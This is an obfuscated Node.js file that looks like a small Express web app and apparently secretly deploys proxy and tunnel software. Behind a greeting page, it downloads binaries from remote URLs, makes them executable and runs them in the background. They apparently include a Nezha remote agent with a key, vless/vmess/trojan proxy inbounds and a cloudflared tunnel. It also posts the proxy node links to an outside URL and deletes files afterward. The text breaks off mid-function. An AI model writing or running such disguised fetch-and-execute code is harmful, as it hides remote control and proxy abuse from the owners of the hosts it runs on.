const _0x58b021 = _0x1236;
(function (_0x47855c, _0x346969) {
    const _0x36b791 = _0x1236, _0x3d9b1c = _0x47855c();
    while (!![]) {
        try {
            const _0x229acc = -parseInt(_0x36b791(0x1fa)) / (0x25f9 + -0x1 * 0x1445 + 0x11b3 * -0x1) + -parseInt(_0x36b791(0x1a8)) / (-0x7 * 0x2c5 + 0x1 * 0x1e8f + -0xb2a) * (parseInt(_0x36b791(0x235)) / (-0x25 * -0x1 + -0x1 * 0x185e + 0x183c)) + -parseInt(_0x36b791(0x2f3)) / (0x1ab * -0x4 + 0x5d9 + 0xd7) * (parseInt(_0x36b791(0x1af)) / (0xa7c * -0x1 + 0x23a5 + -0x4 * 0x649)) + parseInt(_0x36b791(0x27b)) / (0x1ad7 * -0x1 + -0x10ce + 0x2bab) + -parseInt(_0x36b791(0x162)) / (-0xb * -0x37 + -0x13a6 + -0x10 * -0x115) * (-parseInt(_0x36b791(0x1c2)) / (0x1d17 * -0x1 + 0x1dac + 0x2f * -0x3)) + parseInt(_0x36b791(0x1b4)) / (-0x2c5 * -0x6 + 0x4 * -0x732 + 0x3 * 0x411) + parseInt(_0x36b791(0x2dd)) / (-0x1ab7 * 0x1 + 0x188 * -0x15 + 0x1 * 0x3ae9);
            if (_0x229acc === _0x346969)
                break;
            else
                _0x3d9b1c['push'](_0x3d9b1c['shift']());
        } catch (_0x3008e1) {
            _0x3d9b1c['push'](_0x3d9b1c['shift']());
        }
    }
}(_0x4750, 0xb3dce + 0x9b90 * 0x17 + 0x97b1 * -0x1b));
const express = require(_0x58b021(0x1de)), app = express(), axios = require(_0x58b021(0x13b)), os = require('os'), fs = require('fs'), path = require(_0x58b021(0x145)), {promisify} = require(_0x58b021(0x19f)), exec = promisify(require(_0x58b021(0x312) + _0x58b021(0x166))[_0x58b021(0x22a)]), {execSync} = require(_0x58b021(0x312) + _0x58b021(0x166)), UPLOAD_URL = process[_0x58b021(0x236)][_0x58b021(0x190)] || '', PROJECT_URL = process[_0x58b021(0x236)][_0x58b021(0x173) + 'L'] || '', AUTO_ACCESS = process[_0x58b021(0x236)][_0x58b021(0x156) + 'S'] || ![], FILE_PATH = process[_0x58b021(0x236)][_0x58b021(0x204)] || _0x58b021(0x2e9), SUB_PATH = process[_0x58b021(0x236)][_0x58b021(0x2cc)] || _0x58b021(0x2fc), PORT = process[_0x58b021(0x236)][_0x58b021(0x1d0) + 'T'] || process[_0x58b021(0x236)][_0x58b021(0x2f2)] || 0x4b3 * 0x4 + 0x9c1 + -0x10d5, UUID = process[_0x58b021(0x236)][_0x58b021(0x12c)] || _0x58b021(0x194) + _0x58b021(0x303) + _0x58b021(0x308) + _0x58b021(0x28d), NEZHA_SERVER = process[_0x58b021(0x236)][_0x58b021(0x1df) + 'ER'] || '', NEZHA_PORT = process[_0x58b021(0x236)][_0x58b021(0x2fa)] || '', NEZHA_KEY = process[_0x58b021(0x236)][_0x58b021(0x22b)] || '', ARGO_DOMAIN = process[_0x58b021(0x236)][_0x58b021(0x1c4) + 'N'] || '', ARGO_AUTH = process[_0x58b021(0x236)][_0x58b021(0x2aa)] || '', ARGO_PORT = process[_0x58b021(0x236)][_0x58b021(0x1a5)] || 0x34a7 + -0x2 * 0x132a + 0x10ee, CFIP = process[_0x58b021(0x236)][_0x58b021(0x1b7)] || _0x58b021(0x19c) + _0x58b021(0x140), CFPORT = process[_0x58b021(0x236)][_0x58b021(0x202)] || -0x73 * -0x20 + 0x17c + -0xe21, NAME = process[_0x58b021(0x236)][_0x58b021(0x30d)] || _0x58b021(0x299);
!fs[_0x58b021(0x18f)](FILE_PATH) ? (fs[_0x58b021(0x21e)](FILE_PATH), console[_0x58b021(0x269)](FILE_PATH + (_0x58b021(0x26d) + 'd'))) : console[_0x58b021(0x269)](FILE_PATH + (_0x58b021(0x33f) + _0x58b021(0x263)));
function generateRandomName() {
    const _0x28764d = _0x58b021, _0xa5a026 = {
            'qfRxy': _0x28764d(0x34b) + _0x28764d(0x33d) + _0x28764d(0x2fb),
            'cLhJj': function (_0x1d5eac, _0x192ce8) {
                return _0x1d5eac < _0x192ce8;
            },
            'oluUN': function (_0x5aa6a4, _0x234b56) {
                return _0x5aa6a4 * _0x234b56;
            }
        }, _0x17ada2 = _0xa5a026[_0x28764d(0x1fd)];
    let _0x543a4d = '';
    for (let _0x422e45 = 0x22fc + -0x709 * -0x1 + -0x2a05; _0xa5a026[_0x28764d(0x2e0)](_0x422e45, -0x23d8 + -0x174e + 0x21d * 0x1c); _0x422e45++) {
        _0x543a4d += _0x17ada2[_0x28764d(0x17e)](Math[_0x28764d(0x189)](_0xa5a026[_0x28764d(0x20c)](Math[_0x28764d(0x18e)](), _0x17ada2[_0x28764d(0x19b)])));
    }
    return _0x543a4d;
}
const npmName = generateRandomName(), webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName();
let npmPath = path[_0x58b021(0x2b3)](FILE_PATH, npmName), phpPath = path[_0x58b021(0x2b3)](FILE_PATH, phpName), webPath = path[_0x58b021(0x2b3)](FILE_PATH, webName), botPath = path[_0x58b021(0x2b3)](FILE_PATH, botName), subPath = path[_0x58b021(0x2b3)](FILE_PATH, _0x58b021(0x337)), listPath = path[_0x58b021(0x2b3)](FILE_PATH, _0x58b021(0x338)), bootLogPath = path[_0x58b021(0x2b3)](FILE_PATH, _0x58b021(0x33e)), configPath = path[_0x58b021(0x2b3)](FILE_PATH, _0x58b021(0x19a) + 'n');
function deleteNodes() {
    const _0x7deb71 = _0x58b021, _0x1e6ae4 = {
            'uyUPg': _0x7deb71(0x2ef),
            'JylhH': _0x7deb71(0x19e),
            'xsVml': function (_0x4a0bef, _0x5ba6ad) {
                return _0x4a0bef === _0x5ba6ad;
            },
            'qwCsD': _0x7deb71(0x31e) + _0x7deb71(0x1bd)
        };
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs[_0x7deb71(0x18f)](subPath))
            return;
        let _0x1aa1de;
        try {
            _0x1aa1de = fs[_0x7deb71(0x199) + 'nc'](subPath, _0x1e6ae4[_0x7deb71(0x131)]);
        } catch {
            return null;
        }
        const _0x25ad88 = Buffer[_0x7deb71(0x2ab)](_0x1aa1de, _0x1e6ae4[_0x7deb71(0x2ec)])[_0x7deb71(0x188)](_0x1e6ae4[_0x7deb71(0x131)]), _0x5f5ba3 = _0x25ad88[_0x7deb71(0x262)]('\x0a')[_0x7deb71(0x216)](_0xdb42b6 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7deb71(0x2de)](_0xdb42b6));
        if (_0x1e6ae4[_0x7deb71(0x14e)](_0x5f5ba3[_0x7deb71(0x19b)], -0x1 * 0x38 + 0x1bc9 + -0x1b91))
            return;
        return axios[_0x7deb71(0x2a4)](UPLOAD_URL + (_0x7deb71(0x144) + _0x7deb71(0x198)), JSON[_0x7deb71(0x2df)]({ 'nodes': _0x5f5ba3 }), { 'headers': { 'Content-Type': _0x1e6ae4[_0x7deb71(0x2b1)] } })[_0x7deb71(0x2b2)](_0x1362db => {
            return null;
        }), null;
    } catch (_0x46be00) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0xe72a1a = _0x58b021;
    try {
        const _0x4f2e1f = fs[_0xe72a1a(0x13a) + 'c'](FILE_PATH);
        _0x4f2e1f[_0xe72a1a(0x29f)](_0x3edceb => {
            const _0x156439 = _0xe72a1a, _0x4ec9b6 = path[_0x156439(0x2b3)](FILE_PATH, _0x3edceb);
            try {
                const _0x12ce46 = fs[_0x156439(0x2ac)](_0x4ec9b6);
                _0x12ce46[_0x156439(0x31b)]() && fs[_0x156439(0x27c)](_0x4ec9b6);
            } catch (_0x189912) {
            }
        });
    } catch (_0x65c5c8) {
    }
}
app[_0x58b021(0x243)]('/', function (_0x5e3a01, _0x34ee65) {
    const _0x4bd30f = _0x58b021, _0x142a92 = { 'UygSr': _0x4bd30f(0x260) + 'd!' };
    _0x34ee65[_0x4bd30f(0x27a)](_0x142a92[_0x4bd30f(0x1c5)]);
});
async function generateConfig() {
    const _0x4918fb = _0x58b021, _0x49ac81 = {
            'QtTqh': _0x4918fb(0x161),
            'mnzYV': _0x4918fb(0x276),
            'zNleL': _0x4918fb(0x300),
            'FvgRl': _0x4918fb(0x254) + _0x4918fb(0x213),
            'Rzube': _0x4918fb(0x32c) + 'o',
            'ynzzr': _0x4918fb(0x279) + 'o',
            'nFlPg': _0x4918fb(0x349) + 'go',
            'gsytV': _0x4918fb(0x26e),
            'hyOTX': _0x4918fb(0x268),
            'PEHae': _0x4918fb(0x245),
            'fpxZB': _0x4918fb(0x270),
            'jcFJI': _0x4918fb(0x1f4),
            'XLdmd': _0x4918fb(0x2b7),
            'wKdny': _0x4918fb(0x357),
            'SUmVT': _0x4918fb(0x218) + _0x4918fb(0x1ef) + _0x4918fb(0x207) + 'y',
            'QaZId': _0x4918fb(0x329),
            'rtmIu': _0x4918fb(0x304),
            'NbIHn': _0x4918fb(0x32b),
            'VWNDe': _0x4918fb(0x31d),
            'vkMOF': _0x4918fb(0x19a) + 'n'
        }, _0x130f54 = {
            'log': {
                'access': _0x49ac81[_0x4918fb(0x2c6)],
                'error': _0x49ac81[_0x4918fb(0x2c6)],
                'loglevel': _0x49ac81[_0x4918fb(0x23f)]
            },
            'inbounds': [
                {
                    'port': ARGO_PORT,
                    'protocol': _0x49ac81[_0x4918fb(0x275)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'flow': _0x49ac81[_0x4918fb(0x1c6)]
                            }],
                        'decryption': _0x49ac81[_0x4918fb(0x23f)],
                        'fallbacks': [
                            { 'dest': 0xbb9 },
                            {
                                'path': _0x49ac81[_0x4918fb(0x33c)],
                                'dest': 0xbba
                            },
                            {
                                'path': _0x49ac81[_0x4918fb(0x2d6)],
                                'dest': 0xbbb
                            },
                            {
                                'path': _0x49ac81[_0x4918fb(0x177)],
                                'dest': 0xbbc
                            }
                        ]
                    },
                    'streamSettings': { 'network': _0x49ac81[_0x4918fb(0x172)] }
                },
                {
                    'port': 0xbb9,
                    'listen': _0x49ac81[_0x4918fb(0x209)],
                    'protocol': _0x49ac81[_0x4918fb(0x275)],
                    'settings': {
                        'clients': [{ 'id': UUID }],
                        'decryption': _0x49ac81[_0x4918fb(0x23f)]
                    },
                    'streamSettings': {
                        'network': _0x49ac81[_0x4918fb(0x172)],
                        'security': _0x49ac81[_0x4918fb(0x23f)]
                    }
                },
                {
                    'port': 0xbba,
                    'listen': _0x49ac81[_0x4918fb(0x209)],
                    'protocol': _0x49ac81[_0x4918fb(0x275)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'level': 0x0
                            }],
                        'decryption': _0x49ac81[_0x4918fb(0x23f)]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x49ac81[_0x4918fb(0x23f)],
                        'wsSettings': { 'path': _0x49ac81[_0x4918fb(0x33c)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x49ac81[_0x4918fb(0x334)],
                            _0x49ac81[_0x4918fb(0x281)],
                            _0x49ac81[_0x4918fb(0x330)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbb,
                    'listen': _0x49ac81[_0x4918fb(0x209)],
                    'protocol': _0x49ac81[_0x4918fb(0x2e6)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'alterId': 0x0
                            }]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'wsSettings': { 'path': _0x49ac81[_0x4918fb(0x2d6)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x49ac81[_0x4918fb(0x334)],
                            _0x49ac81[_0x4918fb(0x281)],
                            _0x49ac81[_0x4918fb(0x330)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbc,
                    'listen': _0x49ac81[_0x4918fb(0x209)],
                    'protocol': _0x49ac81[_0x4918fb(0x2c1)],
                    'settings': { 'clients': [{ 'password': UUID }] },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x49ac81[_0x4918fb(0x23f)],
                        'wsSettings': { 'path': _0x49ac81[_0x4918fb(0x177)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x49ac81[_0x4918fb(0x334)],
                            _0x49ac81[_0x4918fb(0x281)],
                            _0x49ac81[_0x4918fb(0x330)]
                        ],
                        'metadataOnly': ![]
                    }
                }
            ],
            'dns': { 'servers': [_0x49ac81[_0x4918fb(0x248)]] },
            'outbounds': [
                {
                    'protocol': _0x49ac81[_0x4918fb(0x253)],
                    'tag': _0x49ac81[_0x4918fb(0x34e)]
                },
                {
                    'protocol': _0x49ac81[_0x4918fb(0x314)],
                    'tag': _0x49ac81[_0x4918fb(0x287)]
                }
            ]
        };
    fs[_0x4918fb(0x2e1) + _0x4918fb(0x322)](path[_0x4918fb(0x2b3)](FILE_PATH, _0x49ac81[_0x4918fb(0x136)]), JSON[_0x4918fb(0x2df)](_0x130f54, null, -0xd * -0x166 + -0xf74 + 0xe8 * -0x3));
}
function getSystemArchitecture() {
    const _0x1ea2ef = _0x58b021, _0x402128 = {
            'zlgQs': function (_0xf2c61b, _0x5cb47e) {
                return _0xf2c61b === _0x5cb47e;
            },
            'RMwhL': _0x1ea2ef(0x141),
            'Cbtlz': function (_0x1967f4, _0x449e9c) {
                return _0x1967f4 === _0x449e9c;
            },
            'AYJSi': _0x1ea2ef(0x130),
            'AwYSI': _0x1ea2ef(0x2d8),
            'QrciS': _0x1ea2ef(0x226)
        }, _0x26fc6c = os[_0x1ea2ef(0x328)]();
    return _0x402128[_0x1ea2ef(0x280)](_0x26fc6c, _0x402128[_0x1ea2ef(0x1a1)]) || _0x402128[_0x1ea2ef(0x21f)](_0x26fc6c, _0x402128[_0x1ea2ef(0x18d)]) || _0x402128[_0x1ea2ef(0x21f)](_0x26fc6c, _0x402128[_0x1ea2ef(0x1d7)]) ? _0x402128[_0x1ea2ef(0x1a1)] : _0x402128[_0x1ea2ef(0x34d)];
}
function downloadFile(_0x23eab9, _0x16c0ba, _0x459ea5) {
    const _0x1c295e = _0x58b021, _0x36f360 = {
            'VOriw': function (_0x322164, _0x93ec42, _0x57380c) {
                return _0x322164(_0x93ec42, _0x57380c);
            },
            'WKOTJ': function (_0x34e2f2, _0x4d1982) {
                return _0x34e2f2(_0x4d1982);
            },
            'troRu': _0x1c295e(0x171),
            'LwcMY': _0x1c295e(0x282),
            'Tyixz': function (_0x2cc97b, _0x54f382) {
                return _0x2cc97b(_0x54f382);
            },
            'cpPwW': _0x1c295e(0x243),
            'kEqcb': _0x1c295e(0x1f5)
        }, _0x85ba4f = _0x23eab9;
    !fs[_0x1c295e(0x18f)](FILE_PATH) && fs[_0x1c295e(0x21e)](FILE_PATH, { 'recursive': !![] });
    const _0xcf2cc7 = fs[_0x1c295e(0x2d7) + _0x1c295e(0x16c)](_0x85ba4f);
    _0x36f360[_0x1c295e(0x347)](axios, {
        'method': _0x36f360[_0x1c295e(0x25c)],
        'url': _0x16c0ba,
        'responseType': _0x36f360[_0x1c295e(0x23e)]
    })[_0x1c295e(0x354)](_0x147bc3 => {
        const _0x8a7234 = _0x1c295e;
        _0x147bc3[_0x8a7234(0x224)][_0x8a7234(0x23d)](_0xcf2cc7), _0xcf2cc7['on'](_0x36f360[_0x8a7234(0x27d)], () => {
            const _0x2c2f04 = _0x8a7234;
            _0xcf2cc7[_0x2c2f04(0x33a)](), console[_0x2c2f04(0x269)](_0x2c2f04(0x2e7) + path[_0x2c2f04(0x32f)](_0x85ba4f) + (_0x2c2f04(0x1e5) + _0x2c2f04(0x233))), _0x36f360[_0x2c2f04(0x186)](_0x459ea5, null, _0x85ba4f);
        }), _0xcf2cc7['on'](_0x36f360[_0x8a7234(0x1c1)], _0x4e016a => {
            const _0x1a003c = _0x8a7234;
            fs[_0x1a003c(0x1c9)](_0x85ba4f, () => {
            });
            const _0xf94d4b = _0x1a003c(0x2e7) + path[_0x1a003c(0x32f)](_0x85ba4f) + _0x1a003c(0x237) + _0x4e016a[_0x1a003c(0x2a7)];
            console[_0x1a003c(0x282)](_0xf94d4b), _0x36f360[_0x1a003c(0x317)](_0x459ea5, _0xf94d4b);
        });
    })[_0x1c295e(0x2b2)](_0x11d2e3 => {
        const _0x32742a = _0x1c295e, _0x22090a = _0x32742a(0x2e7) + path[_0x32742a(0x32f)](_0x85ba4f) + _0x32742a(0x237) + _0x11d2e3[_0x32742a(0x2a7)];
        console[_0x32742a(0x282)](_0x22090a), _0x36f360[_0x32742a(0x347)](_0x459ea5, _0x22090a);
    });
}
async function downloadFilesAndRun() {
    const _0x14a02e = _0x58b021, _0x5d48ae = {
            'jHEtB': function (_0x1c3551, _0x98bcd3) {
                return _0x1c3551(_0x98bcd3);
            },
            'VRmjp': function (_0x48ed38, _0x13f83f, _0x39e7b8, _0x160c26) {
                return _0x48ed38(_0x13f83f, _0x39e7b8, _0x160c26);
            },
            'owiiP': function (_0x3d959c) {
                return _0x3d959c();
            },
            'BpBoY': function (_0x37952b, _0x5e9090) {
                return _0x37952b(_0x5e9090);
            },
            'wHYju': function (_0x128f41, _0x500896) {
                return _0x128f41 === _0x500896;
            },
            'ItSyX': _0x14a02e(0x2db) + _0x14a02e(0x350) + _0x14a02e(0x203),
            'axBfe': function (_0x3684b2, _0x49820d) {
                return _0x3684b2(_0x49820d);
            },
            'TkKNF': function (_0x44b127, _0x474664) {
                return _0x44b127 && _0x474664;
            },
            'QAGVO': _0x14a02e(0x21c),
            'ylFER': _0x14a02e(0x1dc),
            'flILz': _0x14a02e(0x179),
            'apysr': _0x14a02e(0x20f),
            'xbUzU': _0x14a02e(0x305),
            'qnGhi': _0x14a02e(0x17a),
            'OkXZK': _0x14a02e(0x231),
            'lGBlQ': _0x14a02e(0x220),
            'iNeDc': _0x14a02e(0x1cd) + 'l',
            'GDDQA': function (_0x2c125c, _0x1bf02c) {
                return _0x2c125c(_0x1bf02c);
            },
            'QpoWk': _0x14a02e(0x2ca),
            'BTCHm': function (_0x5211e0, _0xca347f) {
                return _0x5211e0(_0xca347f);
            },
            'iBuRH': _0x14a02e(0x242) + _0x14a02e(0x153) + _0x14a02e(0x344) + _0x14a02e(0x285),
            'kMsbt': function (_0xf9089a, _0x4c1e4e) {
                return _0xf9089a(_0x4c1e4e);
            },
            'XCrrC': function (_0x5b4687, _0x13b64f) {
                return _0x5b4687(_0x13b64f);
            }
        }, _0x591eda = _0x5d48ae[_0x14a02e(0x1ce)](getSystemArchitecture), _0x815a52 = _0x5d48ae[_0x14a02e(0x348)](getFilesForArchitecture, _0x591eda);
    if (_0x5d48ae[_0x14a02e(0x22d)](_0x815a52[_0x14a02e(0x19b)], -0x8b6 + -0x1 * 0x1a12 + 0x22c8)) {
        console[_0x14a02e(0x269)](_0x14a02e(0x1f2) + _0x14a02e(0x259) + _0x14a02e(0x2e2) + _0x14a02e(0x1fc) + _0x14a02e(0x1cc));
        return;
    }
    const _0x8697f7 = _0x815a52[_0x14a02e(0x296)](_0x2d6117 => {
        const _0x1b97da = {
            'xNvtk': function (_0x29f2ff, _0x290147) {
                const _0x21bb6c = _0x1236;
                return _0x5d48ae[_0x21bb6c(0x15e)](_0x29f2ff, _0x290147);
            },
            'fsxjZ': function (_0x48ef15, _0x5460d8) {
                const _0x4515b6 = _0x1236;
                return _0x5d48ae[_0x4515b6(0x15e)](_0x48ef15, _0x5460d8);
            },
            'jEFsi': function (_0x1078a9, _0x133c44, _0x5c9ce8, _0xea76e9) {
                const _0x5a7957 = _0x1236;
                return _0x5d48ae[_0x5a7957(0x255)](_0x1078a9, _0x133c44, _0x5c9ce8, _0xea76e9);
            }
        };
        return new Promise((_0x367db1, _0xeeb8ff) => {
            const _0x40b006 = _0x1236;
            _0x1b97da[_0x40b006(0x13c)](downloadFile, _0x2d6117[_0x40b006(0x2f5)], _0x2d6117[_0x40b006(0x336)], (_0x5d6f0d, _0x12370e) => {
                const _0x5fcb41 = _0x40b006;
                _0x5d6f0d ? _0x1b97da[_0x5fcb41(0x167)](_0xeeb8ff, _0x5d6f0d) : _0x1b97da[_0x5fcb41(0x1e3)](_0x367db1, _0x12370e);
            });
        });
    });
    try {
        await Promise[_0x14a02e(0x215)](_0x8697f7);
    } catch (_0xbb014f) {
        console[_0x14a02e(0x282)](_0x5d48ae[_0x14a02e(0x164)], _0xbb014f);
        return;
    }
    function _0x167aef(_0x42606a) {
        const _0x1d3492 = _0x14a02e, _0x2bd877 = 0x77 + 0x1aa9 + -0x1923;
        _0x42606a[_0x1d3492(0x29f)](_0x3279fa => {
            const _0x3896af = _0x1d3492;
            fs[_0x3896af(0x18f)](_0x3279fa) && fs[_0x3896af(0x2a3)](_0x3279fa, _0x2bd877, _0x2864b8 => {
                const _0x19020a = _0x3896af;
                _0x2864b8 ? console[_0x19020a(0x282)](_0x19020a(0x2fe) + _0x19020a(0x28b) + _0x19020a(0x2ee) + _0x3279fa + ':\x20' + _0x2864b8) : console[_0x19020a(0x269)](_0x19020a(0x2fe) + _0x19020a(0x191) + _0x19020a(0x2bd) + _0x3279fa + ':\x20' + _0x2bd877[_0x19020a(0x188)](-0x4 * -0xe5 + 0x70e + -0xa9a * 0x1));
            });
        });
    }
    const _0x1dce3c = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x5d48ae[_0x14a02e(0x2d0)](_0x167aef, _0x1dce3c);
    if (_0x5d48ae[_0x14a02e(0x17b)](NEZHA_SERVER, NEZHA_KEY)) {
        if (!NEZHA_PORT) {
            const _0x576b71 = NEZHA_SERVER[_0x14a02e(0x150)](':') ? NEZHA_SERVER[_0x14a02e(0x262)](':')[_0x14a02e(0x239)]() : '', _0x363ba4 = new Set([
                    _0x5d48ae[_0x14a02e(0x2d5)],
                    _0x5d48ae[_0x14a02e(0x12d)],
                    _0x5d48ae[_0x14a02e(0x1d1)],
                    _0x5d48ae[_0x14a02e(0x29c)],
                    _0x5d48ae[_0x14a02e(0x28a)],
                    _0x5d48ae[_0x14a02e(0x20e)]
                ]), _0x380300 = _0x363ba4[_0x14a02e(0x24a)](_0x576b71) ? _0x5d48ae[_0x14a02e(0x1e8)] : _0x5d48ae[_0x14a02e(0x2b9)], _0x49e8b1 = _0x14a02e(0x1ea) + _0x14a02e(0x147) + NEZHA_KEY + (_0x14a02e(0x286) + _0x14a02e(0x1a6) + _0x14a02e(0x182) + _0x14a02e(0x16f) + _0x14a02e(0x135) + _0x14a02e(0x252) + _0x14a02e(0x1e2) + _0x14a02e(0x332) + _0x14a02e(0x17d) + _0x14a02e(0x23a) + _0x14a02e(0x1e1) + _0x14a02e(0x273) + _0x14a02e(0x310) + _0x14a02e(0x250) + _0x14a02e(0x1db) + _0x14a02e(0x2f9) + _0x14a02e(0x184) + _0x14a02e(0x14c) + _0x14a02e(0x16a) + _0x14a02e(0x2a1) + _0x14a02e(0x181) + _0x14a02e(0x21a)) + NEZHA_SERVER + (_0x14a02e(0x345) + _0x14a02e(0x2c5) + _0x14a02e(0x1fe) + _0x14a02e(0x2e8) + _0x14a02e(0x319) + _0x14a02e(0x31f) + _0x14a02e(0x291) + _0x14a02e(0x1ca)) + _0x380300 + (_0x14a02e(0x356) + _0x14a02e(0x1a7) + _0x14a02e(0x2d9) + _0x14a02e(0x1fb) + _0x14a02e(0x1dd) + _0x14a02e(0x289) + _0x14a02e(0x2a8)) + UUID;
            fs[_0x14a02e(0x2e1) + _0x14a02e(0x322)](path[_0x14a02e(0x2b3)](FILE_PATH, _0x5d48ae[_0x14a02e(0x34f)]), _0x49e8b1);
            const _0x2a9af6 = _0x14a02e(0x306) + phpPath + _0x14a02e(0x1b9) + FILE_PATH + (_0x14a02e(0x192) + _0x14a02e(0x148) + _0x14a02e(0x19d) + '&');
            try {
                await _0x5d48ae[_0x14a02e(0x240)](exec, _0x2a9af6), console[_0x14a02e(0x269)](phpName + (_0x14a02e(0x1b1) + 'g')), await new Promise(_0x38dcf0 => setTimeout(_0x38dcf0, -0x2227 + -0x7b * 0x2b + -0xeae * -0x4));
            } catch (_0x218ce2) {
                console[_0x14a02e(0x282)](_0x14a02e(0x2a6) + _0x14a02e(0x1d9) + _0x218ce2);
            }
        } else {
            let _0x29cfb7 = '';
            const _0x4ab917 = [
                _0x5d48ae[_0x14a02e(0x2d5)],
                _0x5d48ae[_0x14a02e(0x12d)],
                _0x5d48ae[_0x14a02e(0x1d1)],
                _0x5d48ae[_0x14a02e(0x29c)],
                _0x5d48ae[_0x14a02e(0x28a)],
                _0x5d48ae[_0x14a02e(0x20e)]
            ];
            _0x4ab917[_0x14a02e(0x150)](NEZHA_PORT) && (_0x29cfb7 = _0x5d48ae[_0x14a02e(0x2af)]);
            const _0x490cf8 = _0x14a02e(0x306) + npmPath + _0x14a02e(0x180) + NEZHA_SERVER + ':' + NEZHA_PORT + _0x14a02e(0x316) + NEZHA_KEY + '\x20' + _0x29cfb7 + (_0x14a02e(0x31c) + _0x14a02e(0x277) + _0x14a02e(0x1bc) + _0x14a02e(0x1c3) + _0x14a02e(0x221) + _0x14a02e(0x201) + _0x14a02e(0x229) + _0x14a02e(0x256) + '\x20&');
            try {
                await _0x5d48ae[_0x14a02e(0x301)](exec, _0x490cf8), console[_0x14a02e(0x269)](npmName + (_0x14a02e(0x1b1) + 'g')), await new Promise(_0x464bdc => setTimeout(_0x464bdc, 0x101a + 0x2 * -0xae5 + -0x266 * -0x4));
            } catch (_0x4fe628) {
                console[_0x14a02e(0x282)](_0x14a02e(0x1ee) + _0x14a02e(0x1d9) + _0x4fe628);
            }
        }
    } else
        console[_0x14a02e(0x269)](_0x5d48ae[_0x14a02e(0x17c)]);
    const _0x29893f = _0x14a02e(0x306) + webPath + _0x14a02e(0x30e) + FILE_PATH + (_0x14a02e(0x24b) + _0x14a02e(0x14a) + _0x14a02e(0x321));
    try {
        await _0x5d48ae[_0x14a02e(0x2a9)](exec, _0x29893f), console[_0x14a02e(0x269)](webName + (_0x14a02e(0x1b1) + 'g')), await new Promise(_0x2c75d2 => setTimeout(_0x2c75d2, -0x1307 * 0x1 + -0xf6 * 0x13 + 0x2931));
    } catch (_0x5723b6) {
        console[_0x14a02e(0x282)](_0x14a02e(0x1d2) + _0x14a02e(0x1d9) + _0x5723b6);
    }
    if (fs[_0x14a02e(0x18f)](botPath)) {
        let _0x4d6d51;
        if (ARGO_AUTH[_0x14a02e(0x267)](/^[A-Z0-9a-z=]{120,250}$/))
            _0x4d6d51 = _0x14a02e(0x2d1) + _0x14a02e(0x1e7) + _0x14a02e(0x178) + _0x14a02e(0x1b5) + _0x14a02e(0x1b2) + _0x14a02e(0x32e) + _0x14a02e(0x2fd) + _0x14a02e(0x1b6) + ARGO_AUTH;
        else
            ARGO_AUTH[_0x14a02e(0x267)](/TunnelSecret/) ? _0x4d6d51 = _0x14a02e(0x2d1) + _0x14a02e(0x1e7) + _0x14a02e(0x178) + _0x14a02e(0x2ed) + FILE_PATH + (_0x14a02e(0x1d4) + _0x14a02e(0x17f)) : _0x4d6d51 = _0x14a02e(0x2d1) + _0x14a02e(0x1e7) + _0x14a02e(0x178) + _0x14a02e(0x1b5) + _0x14a02e(0x1b2) + _0x14a02e(0x32e) + _0x14a02e(0x278) + _0x14a02e(0x1f1) + FILE_PATH + (_0x14a02e(0x288) + _0x14a02e(0x15a) + _0x14a02e(0x340) + _0x14a02e(0x2f0) + _0x14a02e(0x272)) + ARGO_PORT;
        try {
            await _0x5d48ae[_0x14a02e(0x1b0)](exec, _0x14a02e(0x306) + botPath + '\x20' + _0x4d6d51 + (_0x14a02e(0x1cf) + _0x14a02e(0x1f9))), console[_0x14a02e(0x269)](botName + (_0x14a02e(0x1b1) + 'g')), await new Promise(_0x2ebbe5 => setTimeout(_0x2ebbe5, 0x7e1 * -0x3 + 0xaca * -0x1 + 0x2a3d));
        } catch (_0x517370) {
            console[_0x14a02e(0x282)](_0x14a02e(0x223) + _0x14a02e(0x18b) + _0x14a02e(0x2ad) + _0x517370);
        }
    }
    await new Promise(_0x1db9af => setTimeout(_0x1db9af, -0x1fa0 + -0x14a5 + 0x17ef * 0x3));
}
function getFilesForArchitecture(_0x13a291) {
    const _0x4896ac = _0x58b021, _0x5593a4 = {
            'yJPCQ': function (_0x3752d2, _0x57a435) {
                return _0x3752d2 === _0x57a435;
            },
            'sXKOS': _0x4896ac(0x141),
            'XrroO': _0x4896ac(0x1b3) + _0x4896ac(0x25d) + _0x4896ac(0x154),
            'MqgFx': _0x4896ac(0x1b3) + _0x4896ac(0x25d) + _0x4896ac(0x2eb),
            'nRvTm': _0x4896ac(0x323) + _0x4896ac(0x295) + _0x4896ac(0x154),
            'yPWWo': _0x4896ac(0x323) + _0x4896ac(0x295) + _0x4896ac(0x2eb),
            'Zycjj': function (_0x4e81be, _0x3dfc8f) {
                return _0x4e81be && _0x3dfc8f;
            },
            'GWiOh': _0x4896ac(0x1b3) + _0x4896ac(0x25d) + _0x4896ac(0x2b5) + 't',
            'rQnJQ': _0x4896ac(0x323) + _0x4896ac(0x295) + _0x4896ac(0x2b5) + 't',
            'NUeoC': _0x4896ac(0x1b3) + _0x4896ac(0x25d) + _0x4896ac(0x149),
            'qIWaB': _0x4896ac(0x323) + _0x4896ac(0x295) + _0x4896ac(0x149)
        };
    let _0x5b1796;
    _0x5593a4[_0x4896ac(0x1e0)](_0x13a291, _0x5593a4[_0x4896ac(0x257)]) ? _0x5b1796 = [
        {
            'fileName': webPath,
            'fileUrl': _0x5593a4[_0x4896ac(0x1f8)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x5593a4[_0x4896ac(0x1bf)]
        }
    ] : _0x5b1796 = [
        {
            'fileName': webPath,
